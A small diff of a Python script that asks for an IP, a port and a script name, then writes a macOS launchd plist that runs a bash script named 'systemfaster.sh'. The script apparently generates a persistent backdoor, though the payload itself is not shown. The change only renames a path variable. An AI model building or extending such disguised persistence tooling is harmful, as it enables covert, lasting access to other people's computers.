@@ -1,5 +1,6 @@
 import os
 ip = input("Enter IP: ")
+b = ("{p}") 
 a = '"'
 port = int(input("Enter port: "))
 NAME = input("Enter name of script: ")
@@ -21,7 +22,7 @@ daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
     <key>ProgramArguments</key>
     <array>
         <string>/bin/bash</string>
-        <string>{p}/systemfaster.sh</string>
+        <string>{b}/systemfaster.sh</string>
 
     </array>
 </dict>
